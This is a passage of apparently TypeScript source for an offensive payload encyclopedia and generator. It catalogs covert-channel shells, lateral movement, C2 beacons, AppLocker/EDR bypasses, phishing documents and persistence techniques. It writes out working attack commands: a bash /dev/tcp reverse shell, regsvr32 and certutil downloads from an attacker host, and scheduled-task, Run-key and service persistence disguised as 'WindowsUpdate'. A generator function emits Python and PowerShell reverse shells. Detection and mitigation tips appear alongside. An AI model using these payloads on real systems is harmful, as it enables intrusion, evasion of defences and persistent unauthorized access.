    whereToUse: 'When outbound HTTP/HTTPS is blocked but DNS is allowed (many networks allow DNS).',
    pros: ['Bypasses many firewalls', 'Uses a very common protocol', 'Difficult to block'],
    cons: ['Can be slow', 'Requires a DNS server you control', 'May be detected by DNS monitoring'],
    icon: <Network size={18} />,
    color: 'text-cyan-300',
    defaultPort: 53,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['python', 'csharp', 'go'],
    howItWorks: 'The payload encodes commands in DNS queries (e.g., subdomain lookups) and extracts responses from DNS answers.',
    exampleScenario: 'Use a DNS shell to maintain access on a network that allows only DNS outbound.',
    commonListenerCommand: 'dnscat2-server --dns "domain.com"',
    detectionIndicators: [
      'Frequent DNS queries with long subdomain names',
      'DNS TXT records with unusual content',
      'High volume of DNS traffic from a single host'
    ],
    mitigationTips: [
      'Monitor DNS traffic for anomalies (e.g., long subdomains, high query rates)',
      'Use DNS security solutions (e.g., Cisco Umbrella)',
      'Restrict which internal servers can perform external DNS lookups'
    ],
    references: ['https://attack.mitre.org/techniques/T1572/'],
    isComplete: false
  },
  // 18. ICMP Shell
  {
    type: 'icmp_shell',
    name: 'ICMP Shell',
    category: 'Covert Channels',
    description: 'Uses ICMP (ping) packets to establish a covert channel.',
    whatItDoes: 'Sends and receives commands encapsulated in ICMP echo requests/replies.',
    howToUse: 'Set up an ICMP listener (e.g., using icmpsh or custom script), generate payload, run on target.',
    whereToUse: 'When TCP and UDP are restricted, ICMP may be allowed.',
    pros: ['Many firewalls allow ICMP', 'Covert channel', 'Simple to implement'],
    cons: ['Limited bandwidth', 'Can be detected by anomaly detection', 'No built‑in encryption'],
    icon: <Activity size={18} />,
    color: 'text-yellow-400',
    defaultPort: 0,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['python', 'csharp', 'go'],
    howItWorks: 'The payload reads commands from incoming ICMP packets and sends back output via ICMP replies.',
    exampleScenario: 'Use ICMP shell to exfiltrate data from a network that only allows ping traffic.',
    commonListenerCommand: 'icmpsh -t ${lhost} -l <your-ip>',
    detectionIndicators: [
      'ICMP packets with data payload (non‑standard)',
      'High volume of ICMP traffic',
      'ICMP requests and replies with unusual patterns'
    ],
    mitigationTips: [
      'Block ICMP where not needed (or limit to internal use)',
      'Monitor ICMP traffic for anomalies (e.g., large payloads)',
      'Use network monitoring to detect covert channels'
    ],
    references: ['https://attack.mitre.org/techniques/T1572/'],
    isComplete: false
  },
  // 19. SMB Shell
  {
    type: 'smb_shell',
    name: 'SMB Shell',
    category: 'Lateral Movement',
    description: 'Uses SMB named pipes to create a command channel.',
    whatItDoes: 'Establishes a reverse or bind shell over SMB protocol using named pipes.',
    howToUse: 'Requires SMB access to the target. Use tools like smbexec or psexec.',
    whereToUse: 'When you have valid credentials and SMB is open, for lateral movement.',
    pros: ['Leverages built‑in Windows services', 'Works over port 445 (often open)', 'Can be used for pivoting'],
    cons: ['Requires authentication', 'Often logged', 'Limited to Windows environments'],
    icon: <Database size={18} />,
    color: 'text-green-400',
    defaultPort: 445,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['csharp', 'python'],
    howItWorks: 'Uses SMB named pipes to send commands and receive output, mimicking administrative tools.',
    exampleScenario: 'Use SMB shell to move laterally after compromising a domain account.',
    commonListenerCommand: 'smbexec.py Administrator:Password@${lhost}',
    detectionIndicators: [
      'SMB login events (Event ID 4624/4625) from unusual source IPs',
      'Named pipe creation related to command execution',
      'Service creations via SMB'
    ],
    mitigationTips: [
      'Restrict SMB to only required hosts and users',
      'Enable SMB signing and auditing',
      'Monitor for SMB lateral movement indicators'
    ],
    references: ['https://attack.mitre.org/techniques/T1021/'],
    isComplete: false
  },
  // 20. SSH Shell
  {
    type: 'ssh_shell',
    name: 'SSH Reverse Tunnel',
    category: 'Lateral Movement',
    description: 'Creates a reverse SSH tunnel to establish a shell.',
    whatItDoes: 'Uses SSH to create a tunnel back to your machine, giving you a shell.',
    howToUse: 'Run the SSH command with -R to forward a remote port to your machine.',
    whereToUse: 'When SSH outbound is allowed, for persistence or to bypass firewalls.',
    pros: ['Secure (encrypted)', 'Uses standard SSH', 'Easy to set up'],
    cons: ['Requires SSH client', 'May be restricted by policy', 'Requires valid credentials or key'],
    icon: <Key size={18} />,
    color: 'text-gray-400',
    defaultPort: 22,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['bash', 'python', 'go'],
    howItWorks: 'The payload establishes a reverse SSH tunnel using command: ssh -R <local_port>:localhost:22 <your_server>.',
    exampleScenario: 'Use SSH reverse tunnel to gain access to an internal server from the internet.',
    commonListenerCommand: 'ssh -R ${lport}:localhost:22 user@${lhost}',
    detectionIndicators: [
      'SSH connections with port forwarding (-R)',
      'Unusual SSH command line arguments',
      'SSH sessions from internal hosts to external IPs'
    ],
    mitigationTips: [
      'Restrict SSH port forwarding (PermitTunnel no)',
      'Monitor SSH logs for forwarding requests',
      'Use egress filtering to block SSH to unknown external hosts'
    ],
    references: ['https://attack.mitre.org/techniques/T1572/'],
    isComplete: true
  },
  // 21. PowerShell (Plain)
  {
    type: 'powershell_plain',
    name: 'PowerShell Reverse Shell (Plain)',
    category: 'Reverse Shells',
    description: 'A simple, unencoded PowerShell reverse shell.',
    whatItDoes: 'Opens a TCP connection and provides a command shell via PowerShell.',
    howToUse: 'Run the command directly in PowerShell or cmd.',
    whereToUse: 'When you need a quick, simple reverse shell on Windows.',
    pros: ['Easy to remember', 'No external tools', 'Fast to deploy'],
    cons: ['Plaintext traffic', 'Easy to detect', 'Often flagged by AV/EDR'],
    icon: <Terminal size={18} />,
    color: 'text-blue-300',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['powershell'],
    howItWorks: 'Uses .NET TCPClient to connect back and execute commands.',
    exampleScenario: 'Quickly get a shell on a Windows machine during a penetration test.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'PowerShell command line with clear text IP/port',
      'PowerShell spawning network connections',
      'Suspicious function names (TCPClient, GetStream)'
    ],
    mitigationTips: [
      'Enable PowerShell logging (ScriptBlock, Module)',
      'Monitor for unusual PowerShell commands',
      'Use AMSI to block known malicious scripts'
    ],
    references: ['https://attack.mitre.org/techniques/T1059.001/'],
    isComplete: true
  },
  // 22. Bash Reverse Shell
  {
    type: 'bash_reverse',
    name: 'Bash Reverse Shell',
    category: 'Reverse Shells',
    description: 'Classic bash reverse shell using /dev/tcp.',
    whatItDoes: 'Uses bash built‑in /dev/tcp to connect back and spawn a shell.',
    howToUse: 'Run the command directly on a Linux target.',
    whereToUse: 'Linux environments, when you have command execution.',
    pros: ['Very simple', 'No external dependencies', 'Works on most Linux distributions'],
    cons: ['Plaintext', 'Easily detected', 'May not work on systems without /dev/tcp (e.g., older kernels)'],
    icon: <Terminal size={18} />,
    color: 'text-emerald-300',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['bash'],
    howItWorks: 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1',
    exampleScenario: 'Quickly get a shell on a compromised Linux server.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Bash command with /dev/tcp redirection',
      'Network connections from bash process',
      'Suspicious use of file descriptors (>&)'
    ],
    mitigationTips: [
      'Monitor for anomalous bash commands',
      'Restrict outbound network access from servers',
      'Use auditd to log command execution'
    ],
    references: ['https://attack.mitre.org/techniques/T1059/'],
    isComplete: true
  },
  // 23. WMI Shell
  {
    type: 'wmi_shell',
    name: 'WMI Lateral Shell',
    category: 'Lateral Movement',
    description: 'Executes commands on remote hosts using Windows Management Instrumentation (WMI).',
    whatItDoes: 'Uses WMI (Win32_Process.Create) to spawn processes on a remote Windows host with admin credentials.',
    howToUse: 'Requires local admin or domain credentials. Run from a Windows machine with WMI access.',
    whereToUse: 'Lateral movement in Active Directory environments where SMB/RPC are restricted.',
    pros: ['Uses WMI (legitimate admin tool)', 'No file dropped on disk', 'Hard to detect without specific logging'],
    cons: ['Requires local admin or equivalent', 'Heavily logged if WMI auditing is enabled', 'Windows only'],
    icon: <Activity size={18} />,
    color: 'text-violet-400',
    defaultPort: 135,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['powershell', 'csharp', 'vba'],
    howItWorks: 'Connects to remote host via DCOM, instantiates WMI process, spawns cmd.exe with credentials, returns output via redirected file share.',
    exampleScenario: 'Use wmiexec.py or Invoke-WmiCommand after compromising a domain admin to pivot to a file server.',
    commonListenerCommand: 'wmiexec.py Administrator:Password@${lhost}',
    detectionIndicators: [
      'WMI activity (Event ID 5861) from unusual sources',
      'Child processes of WmiPrvSe.exe',
      'DCOM/RPC traffic from admin workstations to servers'
    ],
    mitigationTips: [
      'Restrict DCOM access via GPO',
      'Enable WMI logging (WMI_Activity)',
      'Use LAPS to randomize local admin passwords'
    ],
    references: ['https://attack.mitre.org/techniques/T1047/', 'https://www.rapid7.com/blog/post/2013/03/09/abusing-windows-management-instrumentation-wmi-to-build-a-persistent-asyncronous-network-f/'],
    isComplete: false
  },
  // 24. WinRM Shell
  {
    type: 'winrm_shell',
    name: 'WinRM / PSRemoting',
    category: 'Lateral Movement',
    description: 'PowerShell remoting over WinRM (port 5985/5986).',
    whatItDoes: 'Uses Microsoft\'s WS-Management protocol to execute PowerShell on a remote host.',
    howToUse: 'Requires admin credentials and WinRM enabled. Use Invoke-Command or Enter-PSSession.',
    whereToUse: 'Lateral movement in modern Windows environments where PSRemoting is enabled.',
    pros: ['Native to Windows', 'Encrypted by default', 'No agent required'],
    cons: ['Requires WinRM enabled', 'Heavily logged', 'Only Windows'],
    icon: <Terminal size={18} />,
    color: 'text-blue-400',
    defaultPort: 5985,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['powershell', 'csharp'],
    howItWorks: 'Connects to remote WinRM endpoint over HTTP/HTTPS, authenticates via Kerberos/NTLM, executes PowerShell via WSMan.',
    exampleScenario: 'Use Enter-PSSession to move laterally to a domain controller after compromising domain admin.',
    commonListenerCommand: 'Invoke-Command -ComputerName ${lhost} -ScriptBlock { whoami } -Credential $cred',
    detectionIndicators: [
      'WinRM connections (Event ID 91)',
      'PowerShell remoting activity in logs',
      'Network connections to port 5985/5986 from unusual sources'
    ],
    mitigationTips: [
      'Restrict WinRM via firewall and GPO',
      'Use Just Enough Administration (JEA)',
      'Enable PowerShell remoting logging'
    ],
    references: ['https://attack.mitre.org/techniques/T1021/006/', 'https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/winrmsecurity'],
    isComplete: false
  },
  // 25. Cobalt Strike Beacon
  {
    type: 'cobalt_strike_beacon',
    name: 'Cobalt Strike Beacon',
    category: 'C2 Frameworks',
    description: 'Commercial C2 beacon with malleable C2 profiles.',
    whatItDoes: 'Establishes a C2 channel with sleep mask, malleable C2 profile, and post-exploitation features.',
    howToUse: 'Generate via Cobalt Strike Arsenal → Host on team server → Execute on target → Interact via beacon console.',
    whereToUse: 'Red team engagements, advanced persistent threat simulations.',
    pros: ['Highly customizable', 'Malleable C2 profiles', 'Extensive post-exploitation modules', 'Active community'],
    cons: ['Commercial (paid)', 'Heavily signatured', 'Requires team server setup'],
    icon: <Shield size={18} />,
    color: 'text-orange-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp', 'powershell', 'python'],
    howItWorks: 'Beacon uses HTTP/HTTPS/DNS with sleep/jitter patterns. C2 profile defines traffic shape. Uses reflective DLL injection.',
    exampleScenario: 'Deploy Beacon to maintain persistent access across a large enterprise network with multiple C2 channels.',
    commonListenerCommand: './teamserver ${lhost} password',
    detectionIndicators: [
      'Known Beacon patterns in memory',
      'Named pipe creation (\\\\\\.\\pipe\\MSSE-*)',
      'Sleep/jitter patterns in network traffic'
    ],
    mitigationTips: [
      'Use EDR with Beacon detection signatures',
      'Monitor for known named pipe patterns',
      'Implement network traffic analysis for Beacon patterns'
    ],
    references: ['https://attack.mitre.org/software/S0154/', 'https://www.cobaltstrike.com/'],
    isComplete: false
  },
  // 26. Sliver Beacon
  {
    type: 'sliver_beacon',
    name: 'Sliver C2 Beacon',
    category: 'C2 Frameworks',
    description: 'Open-source cross-platform C2 framework similar to Cobalt Strike.',
    whatItDoes: 'Cross-platform C2 beacon with DNS, HTTPS, and WG (WireGuard) C2 channels.',
    howToUse: 'Setup Sliver server → Generate implant → Execute on target → Interact via CLI',
    whereToUse: 'Red team engagements, open-source C2 operations.',
    pros: ['Open-source and free', 'Cross-platform (Windows/macOS/Linux)', 'WireGuard support', 'Active development'],
    cons: ['Less mature than Cobalt Strike', 'Smaller community', 'Less extensive module library'],
    icon: <Network size={18} />,
    color: 'text-cyan-400',
    defaultPort: 443,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp', 'python', 'go'],
    howItWorks: 'Implant uses encrypted C2 channels with multiple protocols. Supports session management, pivoting, and post-exploitation.',
    exampleScenario: 'Use Sliver for an open-source red team exercise to maintain access across multiple platforms.',
    commonListenerCommand: 'sliver-server --http --lhost ${lhost}',
    detectionIndicators: [
      'Known Sliver patterns in memory',
      'WireGuard traffic anomalies',
      'Encrypted C2 traffic patterns'
    ],
    mitigationTips: [
      'Monitor for known Sliver signatures',
      'Implement network traffic analysis',
      'Use EDR with behavioral detection'
    ],
    references: ['https://github.com/BishopFox/sliver', 'https://attack.mitre.org/software/S0633/'],
    isComplete: false
  },
  // 27. macOS Reverse Shell
  {
    type: 'macos_reverse',
    name: 'macOS Reverse Shell',
    category: 'Reverse Shells',
    description: 'Reverse shell tailored for macOS using native commands and Python.',
    whatItDoes: 'Opens a reverse shell connection from macOS target to your listener using bash or Python.',
    howToUse: 'Generate and execute on macOS target. Works with standard netcat listener.',
    whereToUse: 'macOS environments, post-exploitation on Apple systems.',
    pros: ['Works on modern macOS', 'Uses built-in Python', 'No additional dependencies'],
    cons: ['Plaintext', 'macOS security features may block', 'Requires terminal access'],
    icon: <ShieldAlert size={18} />,
    color: 'text-gray-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['bash', 'python', 'go'],
    howItWorks: 'Uses Python\'s socket, subprocess, and os modules to spawn a shell over TCP.',
    exampleScenario: 'After compromising a macOS machine, establish a reverse shell to maintain access.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Network connections from Python/bash processes',
      'Suspicious terminal activity',
      'Unauthorized network connections'
    ],
    mitigationTips: [
      'Enable macOS firewall and application-level controls',
      'Monitor network connections using lsof',
      'Use endpoint detection tools (EDR)'
    ],
    references: ['https://attack.mitre.org/techniques/T1059/'],
    isComplete: true
  },
  // 28. MSBuild AppLocker Bypass
  {
    type: 'msbuild_applocker_bypass',
    name: 'MSBuild AppLocker Bypass',
    category: 'AppLocker / EDR Bypass',
    description: 'Uses MSBuild.exe to execute C# code and bypass AppLocker.',
    whatItDoes: 'Leverages MSBuild.exe (trusted Microsoft binary) to run inline C# code.',
    howToUse: 'Create an XML .csproj file with inline C# code, execute via msbuild.exe.',
    whereToUse: 'AppLocker bypass, executing code in restricted Windows environments.',
    pros: ['Uses trusted Microsoft binary', 'Bypasses AppLocker', 'No new process created'],
    cons: ['Requires .NET Framework', 'May be flagged by EDR', 'Limited to Windows'],
    icon: <Hammer size={18} />,
    color: 'text-blue-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp', 'xml'],
    howItWorks: 'MSBuild.exe compiles and executes C# code from .csproj file, evading AppLocker rules.',
    exampleScenario: 'Execute a Meterpreter payload on a locked-down Windows system using MSBuild.',
    commonListenerCommand: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj',
    detectionIndicators: [
      'MSBuild.exe spawning child processes',
      'MSBuild.exe making network connections',
      'Unusual .csproj files in temp directories'
    ],
    mitigationTips: [
      'Monitor MSBuild.exe activity',
      'Enable AppLocker logging',
      'Restrict MSBuild execution via WDAC'
    ],
    references: ['https://attack.mitre.org/techniques/T1127/', 'https://www.trustedsec.com/blog/abusing-msbuild-to-bypass-applocker-and-execute-payloads/'],
    isComplete: false
  },
  // 29. Regsvr32 Squiblydoo
  {
    type: 'regsvr32_squiblydoo',
    name: 'Regsvr32 Squiblydoo',
    category: 'AppLocker / EDR Bypass',
    description: 'Uses regsvr32.exe to download and execute a COM scriptlet.',
    whatItDoes: 'Executes code via regsvr32.exe using scriptlet (SCT) files from remote server.',
    howToUse: 'Host an SCT file, run regsvr32 /s /u /i:http://server/payload.sct scrobj.dll',
    whereToUse: 'AppLocker bypass, executing code in restricted Windows environments.',
    pros: ['Uses trusted Windows binary', 'Bypasses AppLocker', 'Executes from memory'],
    cons: ['May be flagged by EDR', 'Requires internet access', 'Limited to Windows'],
    icon: <Hash size={18} />,
    color: 'text-yellow-400',
    defaultPort: 80,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['javascript', 'xml'],
    howItWorks: 'regsvr32.exe loads scrobj.dll which processes the SCT file, executing JavaScript/VBScript code.',
    exampleScenario: 'Bypass AppLocker to execute a PowerShell payload using regsvr32.exe.',
    commonListenerCommand: 'regsvr32 /s /u /i:http://${lhost}/payload.sct scrobj.dll',
    detectionIndicators: [
      'regsvr32.exe with /i flag to external URLs',
      'regsvr32.exe spawning child processes',
      'Network connections from regsvr32.exe'
    ],
    mitigationTips: [
      'Monitor regsvr32.exe activity',
      'Enable AppLocker logging',
      'Block regsvr32.exe using WDAC'
    ],
    references: ['https://attack.mitre.org/techniques/T1218/', 'https://www.trustedsec.com/blog/squiblydoo/'],
    isComplete: false
  },
  // 30. Certutil Downloader
  {
    type: 'certutil_downloader',
    name: 'Certutil Downloader',
    category: 'AppLocker / EDR Bypass',
    description: 'Uses certutil.exe to download and decode files.',
    whatItDoes: 'Leverages certutil.exe to download files, decode base64, and execute payloads.',
    howToUse: 'Host payload (base64 encoded), run certutil -urlcache -f http://server/payload.b64 payload.b64',
    whereToUse: 'LOLBin technique, downloading files in restricted environments.',
    pros: ['Uses trusted Windows binary', 'Can decode base64', 'Built-in to Windows'],
    cons: ['Logs activity', 'May be flagged by EDR', 'Visible in command line'],
    icon: <Download size={18} />,
    color: 'text-green-400',
    defaultPort: 80,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['batch', 'powershell'],
    howItWorks: 'certutil.exe downloads files via HTTP and can decode base64 using -decode flag.',
    exampleScenario: 'Download a base64-encoded payload and decode it to an executable on a restricted Windows system.',
    commonListenerCommand: 'certutil -urlcache -f http://${lhost}/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe',
    detectionIndicators: [
      'certutil.exe with -urlcache flag',
      'certutil.exe downloading from external sources',
      'certutil.exe decoding files'
    ],
    mitigationTips: [
      'Monitor certutil.exe activity',
      'Block certutil.exe network access if not needed',
      'Enable command line logging'
    ],
    references: ['https://attack.mitre.org/techniques/T1105/', 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/'],
    isComplete: false
  },
  // 31. Excel 4.0 Macro
  {
    type: 'excel4_macro',
    name: 'Excel 4.0 Macro (XLM)',
    category: 'Initial Access / Phishing',
    description: 'Legacy Excel 4.0 macros for phishing and initial access.',
    whatItDoes: 'Uses Excel 4.0 macro language to execute commands, evading modern security controls.',
    howToUse: 'Embed in Excel file, send via phishing, victim opens and enables macros.',
    whereToUse: 'Phishing campaigns, bypassing macro detection controls.',
    pros: ['Bypasses many macro controls', 'Legacy format not always monitored', 'Highly effective'],
    cons: ['Requires user interaction', 'May be flagged by some security tools', 'Limited capabilities'],
    icon: <FileCode size={18} />,
    color: 'text-emerald-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['vba', 'javascript'],
    howItWorks: 'Uses Excel 4.0 macro functions like EXEC and RUN to execute commands or download payloads.',
    exampleScenario: 'Deliver an Excel 4.0 macro via phishing that downloads and executes a reverse shell payload.',
    commonListenerCommand: 'nc -lvnp ${lport} (for downloaded payload)',
    detectionIndicators: [
      'Excel 4.0 macro warning',
      'Excel spawning child processes',
      'Network connections from Excel'
    ],
    mitigationTips: [
      'Disable Excel 4.0 macros via GPO',
      'Monitor Excel process activity',
      'Use Office 365 advanced threat protection'
    ],
    references: ['https://attack.mitre.org/techniques/T1059/', 'https://blog.wooledge.org/2022/03/15/excel-4-0-macros-are-back/'],
    isComplete: false
  },
  // 32. DDE Injection
  {
    type: 'dde_injection',
    name: 'Office DDE Injection',
    category: 'Initial Access / Phishing',
    description: 'Uses DDE (Dynamic Data Exchange) to execute commands in Office documents.',
    whatItDoes: 'Uses DDE fields in Office documents to execute commands when opened.',
    howToUse: 'Craft Office document with DDE field, send via phishing, victim opens.',
    whereToUse: 'Phishing, bypassing macro restrictions.',
    pros: ['Bypasses macro restrictions', 'Simple to implement', 'Works on older Office'],
    cons: ['Modern Office has DDE warnings', 'May be flagged by security tools', 'Requires user interaction'],
    icon: <Plus size={18} />,
    color: 'text-purple-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['powershell', 'vba'],
    howItWorks: 'DDE field in Word/Excel executes command via cmd.exe when document opens.',
    exampleScenario: 'Send a Word document with DDE field that executes a PowerShell reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Office processes spawning cmd.exe',
      'DDE field warnings in Office',
      'Unusual network connections from Office'
    ],
    mitigationTips: [
      'Disable DDE in Office via GPO',
      'Monitor Office process activity',
      'Use Office 365 advanced threat protection'
    ],
    references: ['https://attack.mitre.org/techniques/T1059/', 'https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/'],
    isComplete: false
  },
  // 33. Donut Shellcode Generator
  {
    type: 'donut_shellcode',
    name: 'Donut Shellcode',
    category: 'AppLocker / EDR Bypass',
    description: '.NET to shellcode generator for in-memory execution.',
    whatItDoes: 'Converts .NET assemblies to position-independent shellcode that executes in memory.',
    howToUse: 'Generate shellcode with Donut, execute in-memory using various loaders.',
    whereToUse: 'Bypassing EDR, executing .NET payloads without disk writes.',
    pros: ['Bypasses many EDR solutions', 'Executes from memory', 'Works with .NET payloads'],
    cons: ['Requires Donut tool', 'May be detected by advanced EDR', 'Complex setup'],
    icon: <Code size={18} />,
    color: 'text-rose-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['raw_c', 'csharp', 'python'],
    howItWorks: 'Donut converts .NET assemblies to shellcode using process injection and AMSI bypass techniques.',
    exampleScenario: 'Convert a Cobalt Strike Beacon to shellcode and execute in-memory using a custom loader.',
    commonListenerCommand: 'donut.exe -a 2 -f 1 -i payload.exe',
    detectionIndicators: [
      'Process injection events',
      'Unusual RWX memory allocations',
      'Known Donut patterns in memory'
    ],
    mitigationTips: [
      'Enable memory scanning in EDR',
      'Monitor process injection events',
      'Use Controlled Folder Access'
    ],
    references: ['https://github.com/TheWover/donut', 'https://attack.mitre.org/techniques/T1055/'],
    isComplete: false
  },
  // 34. COM Hijacking
  {
    type: 'com_hijack',
    name: 'COM Hijacking Persistence',
    category: 'Persistence',
    description: 'COM object hijacking for persistence and privilege escalation.',
    whatItDoes: 'Modifies COM registry entries to execute arbitrary code when a COM object is instantiated.',
    howToUse: 'Find COM object, replace InprocServer32/ClassId to point to malicious DLL.',
    whereToUse: 'Persistence, privilege escalation, bypassing security controls.',
    pros: ['Very stealthy', 'Persistence across reboots', 'Bypasses many security tools'],
    cons: ['Requires admin privileges to modify registry', 'Complex to discover COM objects', 'Can break applications'],
    icon: <GitMerge size={18} />,
    color: 'text-red-400',
    defaultPort: 0,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['csharp', 'raw_c'],
    howItWorks: 'Registry key (HKCR/CLSID) is modified to point to a malicious DLL, which is loaded when the COM object is invoked.',
    exampleScenario: 'Hijack the COM object for Windows Search to maintain persistence without being detected.',
    commonListenerCommand: 'N/A - registry modification for persistence',
    detectionIndicators: [
      'Registry modifications to COM keys',
      'Unusual DLLs loaded via COM',
      'Unusual process creation during COM operations'
    ],
    mitigationTips: [
      'Monitor COM registry modifications',
      'Use Windows Defender Exploit Guard',
      'Implement application whitelisting'
    ],
    references: ['https://attack.mitre.org/techniques/T1546/', 'https://www.trustedsec.com/blog/com-hijacking/'],
    isComplete: false
  },
  // 35. Task Scheduler Persistence
  {
    type: 'task_scheduler_persistence',
    name: 'Task Scheduler Persistence',
    category: 'Persistence',
    description: 'Uses Windows Task Scheduler to maintain persistence.',
    whatItDoes: 'Creates scheduled tasks that run malicious code at boot or user logon.',
    howToUse: 'Use schtasks.exe or PowerShell to create a scheduled task.',
    whereToUse: 'Persistence across reboots, maintaining access on Windows systems.',
    pros: ['Stealthy persistence', 'Can run as SYSTEM', 'Supports triggers (boot, logon, idle)'],
    cons: ['Requires admin for SYSTEM tasks', 'Logged in event logs', 'Can be detected by EDR'],
    icon: <Clock size={18} />,
    color: 'text-amber-400',
    defaultPort: 0,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['powershell', 'csharp', 'batch'],
    howItWorks: 'Uses Task Scheduler API (schtasks.exe) to create a task that runs on logon or at system startup.',
    exampleScenario: 'Create a scheduled task to run a reverse shell every 5 minutes to maintain persistence.',
    commonListenerCommand: 'schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\payload.exe" /sc onlogon /ru SYSTEM',
    detectionIndicators: [
      'Unusual scheduled tasks (schtasks.exe)',
      'Scheduled tasks with suspicious names or paths',
      'Tasks running from temp directories'
    ],
    mitigationTips: [
      'Monitor scheduled task creation',
      'Restrict schtasks.exe execution',
      'Audit scheduled task logs'
    ],
    references: ['https://attack.mitre.org/techniques/T1053/', 'https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page/'],
    isComplete: false
  },
  // 36. Registry Run Persistence
  {
    type: 'registry_persistence',
    name: 'Registry Run Persistence',
    category: 'Persistence',
    description: 'Uses Windows Registry Run keys for persistence.',
    whatItDoes: 'Adds malicious entry to registry Run keys (HKLM/HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run).',
    howToUse: 'Create registry entry using reg.exe, PowerShell, or C#.',
    whereToUse: 'Persistence across logons, maintaining access on Windows.',
    pros: ['Stealthy', 'Runs on user logon', 'Easy to implement'],
    cons: ['Heavily monitored by security tools', 'Requires admin for HKLM', 'Often flagged'],
    icon: <Database size={18} />,
    color: 'text-cyan-400',
    defaultPort: 0,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['powershell', 'batch', 'csharp'],
    howItWorks: 'Adds a registry value pointing to the payload in Run or RunOnce keys, executed on user logon.',
    exampleScenario: 'Add a key to HKCU\\...\\Run that points to a backdoor executable for persistence.',
    commonListenerCommand: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "LegitApp" /t REG_SZ /d "C:\\Users\\Public\\backdoor.exe"',
    detectionIndicators: [
      'Registry modifications to Run keys',
      'Suspicious entries in Run keys',
      'Autoruns showing unknown entries'
    ],
    mitigationTips: [
      'Monitor registry changes in Run keys',
      'Use autoruns monitoring tools',
      'Audit registry changes'
    ],
    references: ['https://attack.mitre.org/techniques/T1547/'],
    isComplete: false
  },
  // 37. Service Persistence
  {
    type: 'service_persistence',
    name: 'Windows Service Persistence',
    category: 'Persistence',
    description: 'Creates a Windows service for persistence.',
    whatItDoes: 'Creates a new Windows service that runs malicious code on boot.',
    howToUse: 'Use sc.exe, PowerShell, or C# to create a service.',
    whereToUse: 'Persistence across reboots, running as SYSTEM.',
    pros: ['Runs as SYSTEM (high privileges)', 'Persists across reboots', 'Looks like legitimate service'],
    cons: ['Requires admin privileges', 'Heavily monitored', 'Event logs record service creation'],
    icon: <Server size={18} />,
    color: 'text-blue-400',
    defaultPort: 0,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['csharp', 'powershell', 'batch'],
    howItWorks: 'Creates a new service using sc.exe or PowerShell that executes the payload on system start.',
    exampleScenario: 'Create a service named "WindowsUpdate" that runs a reverse shell as SYSTEM.',
    commonListenerCommand: 'sc create WindowsUpdate binPath= "C:\\Users\\Public\\payload.exe" start= auto',
    detectionIndicators: [
      'New service creation (sc.exe)',
      'Services with suspicious names or paths',
      'Services running from temp directories'
    ],
    mitigationTips: [
      'Monitor service creation events',
      'Restrict sc.exe execution',
      'Audit service creation logs'
    ],
    references: ['https://attack.mitre.org/techniques/T1543/', 'https://docs.microsoft.com/en-us/windows/win32/services/services'],
    isComplete: false
  }
]

// ─── Build lookup map ─────────────────────────────────────
const PAYLOAD_BY_TYPE: Record<PayloadType, PayloadInfo> = PAYLOAD_ENCYCLOPEDIA.reduce(
  (acc, p) => ({ ...acc, [p.type]: p }), 
  {} as Record<PayloadType, PayloadInfo>
)

// ─── Generator ─────────────────────────────────────────────
function generatePayloadCode(
  type: PayloadType,
  format: OutputFormat,
  lhost: string,
  lport: number,
  obfuscation: ObfuscationLevel
): string {
  const base = `// ${type.toUpperCase()} Payload - ${format} - ${obfuscation} obfuscation
// LHOST: ${lhost} | LPORT: ${lport}

`

  let rawCode = ''

  switch (type) {
    case 'reverse_shell': {
      switch (format) {
        case 'python':
          rawCode = base + `import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("${lhost}", ${lport}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])`
          break
        case 'powershell':
          rawCode = base + `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
